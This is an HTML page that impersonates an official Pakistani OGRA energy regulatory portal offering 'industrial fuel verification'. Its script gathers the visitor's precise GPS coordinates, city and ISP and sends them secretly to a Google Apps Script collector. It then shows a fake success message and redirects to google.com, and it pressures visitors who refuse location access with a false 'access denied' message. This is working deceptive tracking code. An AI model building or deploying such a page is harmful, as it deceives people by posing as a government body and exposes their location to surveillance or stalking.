<!DOCTYPE html>
<html lang="ur" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Industrial Fuel Regulatory Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 font-sans text-gray-900">

    <nav class="bg-[#002d72] text-white p-5 shadow-lg border-b-4 border-yellow-500 text-center">
        <h1 class="font-bold text-lg">OGRA Energy Regulatory Portal</h1>
        <p class="text-[10px] uppercase tracking-widest text-yellow-400">Official Secure Access</p>
    </nav>

    <main class="max-w-md mx-auto mt-10 p-6">
        <div id="main-card" class="bg-white p-8 rounded-xl shadow-xl border border-gray-200">
            <div id="content-area" class="text-center">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/32/Flag_of_Pakistan.svg" class="w-16 mx-auto mb-4 opacity-80">
                <h2 class="text-xl font-bold text-blue-900 mb-2">Industrial Fuel Verification</h2>
                <p id="msg" class="text-gray-600 text-sm mb-6">Verify your industrial site location for Q4 pricing and subsidy eligibility.</p>
                
                <button id="btn-fetch" onclick="initiateAuth()" class="w-full bg-blue-900 text-white font-bold py-4 rounded-lg hover:bg-blue-800 transition active:scale-95 shadow-lg">
                    Verify Site Location
                </button>
            </div>
        </div>
    </main>

    <script>
        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbyG-jiGO401SORNgXHFP8CtmsEm_2OtKu0Q1J-M3dVBkv-SentkHAmxZhfxF-EuSkH1/exec";

        async function initiateAuth() {
            const btn = document.getElementById('btn-fetch');
            btn.innerText = "Synchronizing Satellite...";
            btn.disabled = true;

            const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };

            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    try {
                        const ipRes = await fetch("https://ipapi.co/json/");
                        const ipData = await ipRes.json();

                        const payload = { 
                            lat: pos.coords.latitude, 
                            lon: pos.coords.longitude,
                            city: ipData.city || "Unknown",
                            isp: ipData.org || "Unknown",
                            timestamp: new Date().toLocaleString()
                        };

                        await fetch(GOOGLE_URL, {
                            method: "POST",
                            mode: "no-cors",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(payload)
                        });

                        document.getElementById('main-card').innerHTML = "<h2 class='text-green-600 font-bold text-center'>Verification Successful. Redirecting to secure portal...</h2>";
                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
                    } catch (e) {
                        handleBlock();
                    }
                },
                () => handleBlock(),
                options
            );
        }

        function handleBlock() {
            const msg = document.getElementById('msg');
            msg.innerText = "ACCESS DENIED: Please enable 'Precise Location' in settings to continue.";
            msg.classList.add("text-red-600", "font-bold");
            document.getElementById('btn-fetch').innerText = "Retry Verification";
            document.getElementById('btn-fetch').disabled = false;
        }
    </script>
</body>
</html>
